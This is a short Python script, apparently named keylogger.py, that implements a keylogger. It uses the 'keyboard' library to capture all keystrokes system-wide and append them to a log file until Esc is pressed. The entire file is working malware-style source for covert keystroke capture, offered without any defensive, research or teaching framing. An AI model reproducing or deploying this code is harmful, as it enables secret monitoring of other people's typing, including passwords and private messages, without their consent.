import sys
import os
import time
from threading import Thread
import keyboard

class Keylogger:
    def __init__(self, log_file):
        self.log_file = log_file
        if not os.path.exists(log_file):
            with open(log_file, 'w') as f:
                pass

    def write_to_file(self, string):
        with open(self.log_file, 'a') as f:
            f.write(string)

    def process_key(self, key):
        if len(key) > 1:
            self.write_to_file('[' + key + ']')
        else:
            self.write_to_file(key)

    def mainloop(self):
        while True:
            event = keyboard.read_event()
            if event.name == 'esc':
                break
            elif event.name == 'space':
                self.process_key(' ')
            elif event.name == 'enter':
                self.process_key('\n')
            else:
                self.write_to_file(event.name)

def main():
    if len(sys.argv) != 2:
        print("Usage: python keylogger.py <log_file>")
        sys.exit()

    log_file = sys.argv[1]
    keylogger = Keylogger(log_file)
    keylogger.mainloop()

if __name__ == "__main__":
    main()